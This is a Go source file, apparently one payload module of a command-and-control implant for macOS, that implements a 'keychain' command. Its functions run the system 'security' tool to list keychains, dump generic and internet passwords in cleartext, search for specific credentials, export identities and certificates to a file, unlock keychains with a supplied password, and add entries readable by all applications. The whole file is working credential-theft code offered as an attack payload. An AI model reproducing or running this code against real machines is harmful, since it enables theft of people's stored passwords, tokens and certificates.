// server/docker/payloads/Darwin/action_keychain_darwin.go
//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"time"
)

// KeychainCommand manages macOS keychain operations
type KeychainCommand struct{}

func (c *KeychainCommand) Name() string {
	return "keychain"
}

func (c *KeychainCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	action := args[0]
	switch action {
	case "list":
		return c.listKeychains()
	case "dump":
		return c.dumpKeychain(args[1:])
	case "search":
		return c.searchKeychain(args[1:])
	case "add":
		return c.addToKeychain(args[1:])
	case "delete":
		return c.deleteFromKeychain(args[1:])
	case "export":
		return c.exportKeychain(args[1:])
	case "unlock":
		return c.unlockKeychain(args[1:])
	default:
		return CommandResult{
			Output:   ErrCtx(E21, action),
			ExitCode: 1,
		}
	}
}

// listKeychains lists all available keychains
func (c *KeychainCommand) listKeychains() CommandResult {
	output := "[*] Listing available keychains...\n"
	output += strings.Repeat("-", 60) + "\n\n"

	// List default keychains
	cmd := exec.Command("security", "list-keychains")
	if result, err := cmd.Output(); err == nil {
		output += "[+] System keychains:\n"
		lines := strings.Split(string(result), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			line = strings.Trim(line, "\"")
			if line != "" {
				output += fmt.Sprintf("  %s\n", line)

				// Check if readable
				if _, err := os.Stat(line); err == nil {
					output += "    [Accessible]\n"
				} else {
					output += "    [Not accessible]\n"
				}
			}
		}
	}

	// List login keychain
	output += "\n[+] Default login keychain:\n"
	cmd = exec.Command("security", "default-keychain")
	if result, err := cmd.Output(); err == nil {
		defaultKc := strings.TrimSpace(string(result))
		defaultKc = strings.Trim(defaultKc, "\"")
		output += fmt.Sprintf("  %s\n", defaultKc)
	}

	// Check for additional keychains in user directory
	if u, err := user.Current(); err == nil {
		keychainDir := filepath.Join(u.HomeDir, "Library", "Keychains")
		output += fmt.Sprintf("\n[+] Keychains in %s:\n", keychainDir)

		if entries, err := os.ReadDir(keychainDir); err == nil {
			for _, entry := range entries {
				if !entry.IsDir() && strings.Contains(entry.Name(), "keychain") {
					output += fmt.Sprintf("  %s\n", entry.Name())
				}
			}
		}
	}

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// dumpKeychain dumps keychain contents
func (c *KeychainCommand) dumpKeychain(args []string) CommandResult {
	keychainPath := ""

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--keychain":
			if i+1 < len(args) {
				keychainPath = args[i+1]
				i++
			}
		}
	}

	output := "[*] Dumping keychain items...\n"
	output += "[!] Note: This requires keychain to be unlocked\n"
	output += strings.Repeat("-", 60) + "\n\n"

	// Dump generic passwords
	output += "[+] Generic Passwords:\n"
	cmd := exec.Command("security", "dump-keychain", "-d")
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, keychainPath)
	}

	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	if result, err := cmd.Output(); err == nil {
		// Parse output for passwords
		lines := strings.Split(string(result), "\n")
		currentItem := make(map[string]string)

		for _, line := range lines {
			line = strings.TrimSpace(line)

			if strings.HasPrefix(line, "keychain:") {
				if len(currentItem) > 0 {
					output += c.formatKeychainItem(currentItem)
					currentItem = make(map[string]string)
				}
				currentItem["keychain"] = strings.TrimPrefix(line, "keychain:")
			} else if strings.Contains(line, "\"acct\"") {
				parts := strings.Split(line, "=")
				if len(parts) > 1 {
					currentItem["account"] = strings.Trim(parts[1], " \"")
				}
			} else if strings.Contains(line, "\"svce\"") {
				parts := strings.Split(line, "=")
				if len(parts) > 1 {
					currentItem["service"] = strings.Trim(parts[1], " \"")
				}
			} else if strings.Contains(line, "\"desc\"") {
				parts := strings.Split(line, "=")
				if len(parts) > 1 {
					currentItem["description"] = strings.Trim(parts[1], " \"")
				}
			} else if strings.HasPrefix(line, "data:") {
				currentItem["data"] = strings.TrimPrefix(line, "data:")
			} else if strings.HasPrefix(line, "password:") {
				pwd := strings.TrimPrefix(line, "password:")
				pwd = strings.Trim(pwd, " \"")
				currentItem["password"] = pwd
			}
		}

		// Output last item
		if len(currentItem) > 0 {
			output += c.formatKeychainItem(currentItem)
		}
	} else {
		output += fmt.Sprintf("  Error: %s\n", stderr.String())
		output += "  [!] Keychain may be locked. Use 'keychain unlock' first.\n"
	}

	// Dump internet passwords
	output += "\n[+] Internet Passwords:\n"
	cmd = exec.Command("security", "find-internet-password", "-g", "-a", "")
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, keychainPath)
	}

	cmd.Stderr = &stderr
	if _, err := cmd.Output(); err == nil {
		// Parse stderr for passwords (security outputs passwords to stderr)
		output += string(stderr.Bytes())
	}

	// List certificates
	output += "\n[+] Certificates:\n"
	cmd = exec.Command("security", "find-certificate", "-a")
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, keychainPath)
	}

	if result, err := cmd.Output(); err == nil {
		lines := strings.Split(string(result), "\n")
		for _, line := range lines {
			if strings.Contains(line, "labl") || strings.Contains(line, "subj") {
				output += fmt.Sprintf("  %s\n", strings.TrimSpace(line))
			}
		}
	}

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// formatKeychainItem formats a keychain item for display
func (c *KeychainCommand) formatKeychainItem(item map[string]string) string {
	output := "\n  === Item ===\n"
	if service, ok := item["service"]; ok {
		output += fmt.Sprintf("  Service: %s\n", service)
	}
	if account, ok := item["account"]; ok {
		output += fmt.Sprintf("  Account: %s\n", account)
	}
	if desc, ok := item["description"]; ok {
		output += fmt.Sprintf("  Description: %s\n", desc)
	}
	if password, ok := item["password"]; ok {
		output += fmt.Sprintf("  Password: %s\n", password)
	}
	if data, ok := item["data"]; ok {
		// Try to decode hex data
		if decoded, err := base64.StdEncoding.DecodeString(data); err == nil {
			output += fmt.Sprintf("  Data: %s\n", string(decoded))
		} else {
			output += fmt.Sprintf("  Data (raw): %s\n", data)
		}
	}
	return output
}

// searchKeychain searches for specific items
func (c *KeychainCommand) searchKeychain(args []string) CommandResult {
	var service, account, label string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--service":
			if i+1 < len(args) {
				service = args[i+1]
				i++
			}
		case "--account":
			if i+1 < len(args) {
				account = args[i+1]
				i++
			}
		case "--label":
			if i+1 < len(args) {
				label = args[i+1]
				i++
			}
		}
	}

	output := "[*] Searching keychain...\n"
	output += strings.Repeat("-", 60) + "\n\n"

	// Search generic passwords
	cmd := exec.Command("security", "find-generic-password")
	if service != "" {
		cmd.Args = append(cmd.Args, "-s", service)
	}
	if account != "" {
		cmd.Args = append(cmd.Args, "-a", account)
	}
	if label != "" {
		cmd.Args = append(cmd.Args, "-l", label)
	}
	cmd.Args = append(cmd.Args, "-g") // Show password

	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	if result, err := cmd.Output(); err == nil {
		output += "[+] Found generic password:\n"
		output += string(result)
		// Password is in stderr
		if stderr.Len() > 0 {
			output += string(stderr.Bytes())
		}
	} else {
		output += "[-] No generic password found\n"
	}

	// Search internet passwords
	output += "\n"
	cmd = exec.Command("security", "find-internet-password")
	if service != "" {
		cmd.Args = append(cmd.Args, "-s", service)
	}
	if account != "" {
		cmd.Args = append(cmd.Args, "-a", account)
	}
	if label != "" {
		cmd.Args = append(cmd.Args, "-l", label)
	}
	cmd.Args = append(cmd.Args, "-g")

	stderr.Reset()
	cmd.Stderr = &stderr

	if result, err := cmd.Output(); err == nil {
		output += "[+] Found internet password:\n"
		output += string(result)
		if stderr.Len() > 0 {
			output += string(stderr.Bytes())
		}
	} else {
		output += "[-] No internet password found\n"
	}

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// addToKeychain adds an item to the keychain
func (c *KeychainCommand) addToKeychain(args []string) CommandResult {
	var service, account, password string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--service":
			if i+1 < len(args) {
				service = args[i+1]
				i++
			}
		case "--account":
			if i+1 < len(args) {
				account = args[i+1]
				i++
			}
		case "--password":
			if i+1 < len(args) {
				password = args[i+1]
				i++
			}
		}
	}

	if service == "" || account == "" || password == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Add to keychain
	cmd := exec.Command("security", "add-generic-password",
		"-s", service,
		"-a", account,
		"-w", password,
		"-T", "") // Allow access by all applications

	if _, err := cmd.CombinedOutput(); err != nil {
		return CommandResult{
			Output:   Err(E11),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:      SuccCtx(S1, fmt.Sprintf("%s:%s", service, account)),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// deleteFromKeychain deletes an item from the keychain
func (c *KeychainCommand) deleteFromKeychain(args []string) CommandResult {
	var service, account string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--service":
			if i+1 < len(args) {
				service = args[i+1]
				i++
			}
		case "--account":
			if i+1 < len(args) {
				account = args[i+1]
				i++
			}
		}
	}

	if service == "" && account == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Delete from keychain
	cmd := exec.Command("security", "delete-generic-password")
	if service != "" {
		cmd.Args = append(cmd.Args, "-s", service)
	}
	if account != "" {
		cmd.Args = append(cmd.Args, "-a", account)
	}

	if _, err := cmd.CombinedOutput(); err != nil {
		return CommandResult{
			Output:   Err(E11),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:      SuccCtx(S2, fmt.Sprintf("%s:%s", service, account)),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// exportKeychain exports keychain to a file
func (c *KeychainCommand) exportKeychain(args []string) CommandResult {
	var keychainPath, outputPath string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--keychain":
			if i+1 < len(args) {
				keychainPath = args[i+1]
				i++
			}
		case "--output":
			if i+1 < len(args) {
				outputPath = args[i+1]
				i++
			}
		}
	}

	if outputPath == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	output := fmt.Sprintf("[*] Exporting keychain to %s...\n", outputPath)

	// Use security command to export
	cmd := exec.Command("security", "export")
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, "-k", keychainPath)
	}
	cmd.Args = append(cmd.Args, "-t", "identities", "-f", "pkcs12", "-o", outputPath)

	if result, err := cmd.CombinedOutput(); err != nil {
		// Try alternative export method
		output += "[!] PKCS12 export failed, trying alternative method...\n"

		// Dump keychain to text file
		cmd = exec.Command("security", "dump-keychain", "-d")
		if keychainPath != "" {
			cmd.Args = append(cmd.Args, keychainPath)
		}

		if dumpOutput, err := cmd.Output(); err == nil {
			if err := os.WriteFile(outputPath, dumpOutput, 0600); err != nil {
				return CommandResult{
					Output:   fmt.Sprintf("Failed to write output: %v", err),
					ExitCode: 1,
				}
			}
			output += fmt.Sprintf("[+] Keychain dumped to %s\n", outputPath)
		} else {
			return CommandResult{
				Output:   fmt.Sprintf("%sFailed to export: %s", output, string(result)),
				ExitCode: 1,
			}
		}
	} else {
		output += fmt.Sprintf("[+] Keychain exported to %s\n", outputPath)
	}

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// unlockKeychain unlocks a keychain
func (c *KeychainCommand) unlockKeychain(args []string) CommandResult {
	var keychainPath, password string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--keychain":
			if i+1 < len(args) {
				keychainPath = args[i+1]
				i++
			}
		case "--password":
			if i+1 < len(args) {
				password = args[i+1]
				i++
			}
		}
	}

	if password == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Unlock keychain
	cmd := exec.Command("security", "unlock-keychain", "-p", password)
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, keychainPath)
	}

	if output, err := cmd.CombinedOutput(); err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to unlock keychain: %s", string(output)),
			ExitCode: 1,
		}
	}

	result := "[+] Keychain unlocked successfully\n"
	if keychainPath != "" {
		result += fmt.Sprintf("    Keychain: %s\n", keychainPath)
	} else {
		result += "    Keychain: default\n"
	}

	return CommandResult{
		Output:      result,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
